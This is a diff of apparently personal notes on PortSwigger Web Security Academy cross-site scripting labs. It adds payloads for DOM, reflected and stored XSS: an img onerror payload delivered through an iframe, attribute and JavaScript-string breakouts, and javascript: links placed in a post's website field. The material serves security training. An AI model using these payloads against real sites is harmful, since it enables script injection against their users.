@@ -35,7 +35,7 @@ In the leaving post commet functionality, the comment body is vulnerable:
 
 ## DOM XSS in jQuery selector sink using a hashchange event
 
-On adding to URL this payload the XSS triggers via jQuery handler `$()`:
+On appending to URL this payload the XSS triggers via creating provided `img` element by jQuery handler `$()`:
 ```
 #<img src=X onerror=print()>
 ```
@@ -43,4 +43,29 @@ On adding to URL this payload the XSS triggers via jQuery handler `$()`:
 Deliver to victim:
 ```
 <iframe src='https://0a0d00c00320c7a8868f0d22007000ee.web-security-academy.net/#' onload="this.src+='<img src=X onerror=print()>'"></iframe>
+```
+
+## Reflected XSS into attribute with angle brackets HTML-encoded
+
+```
+?search=" autofocus onfocus=alert(document.domain) x="
+```
+
+## Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+Create a post with `Website` parameter equal to:
+```
+javascript:alert(document.domain)
+```
+or to:
+```
+javascript:print()
+```
+It is injected into `href` tag later
+
+## Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+Characters `'` are not encoded by 
+```
+?search='; alert(1); var x='
 ```
